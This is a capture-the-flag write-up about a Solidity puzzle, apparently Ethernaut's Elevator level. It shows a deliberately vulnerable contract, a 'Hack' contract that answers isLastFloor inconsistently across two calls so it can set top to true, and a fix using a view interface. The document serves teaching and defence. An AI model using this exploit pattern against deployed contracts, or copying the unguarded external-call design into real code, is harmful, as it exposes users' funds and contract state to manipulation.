## Elevator Challenge

## The goal of this challenge is to set the top boolean to true in the Elevator contract which would mean that we have reached the top of the building.

Contract:

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

If you look at the goTo function it is taking an instance of the building contract which means this can only be called by another contract, So let's create another contract and change the isLastFloor function to have a falsy value first and then a set it up to true in the second call to set the top state to true and call the function goTo regardless of whatever value.

```javascript
contract Hack{

    // First of let's set the target to be the elevator contract within the constructor
    Elevator internal elevator;

    constructor(address _target) {
        elevator = Elevator(_target);
    }

    bool isSecondCall;

    // in the first call it will set the isSecondCall variable to true and return false and return true after that on every function call
    function isLastFloor(uint) public returns(bool) {
        if(isSecondCall) {
            return true;
        }

        isSecondCall = true;
        return false;
    }

    function attack() public {
        elevator.goTo(99); // value doesn't matter at all
    }

}
```

This will set the value of the top to be true and we will reach the top and successfully finish the challenge.

**Prevention:**

We would have been able to prevent this from happening if we declared the isLastFloor function as a `view` function which would have prevented it from being able to change the state variable.

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external view returns (bool);
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

```

This wouldn't have allowed the user to be able to reach the top.
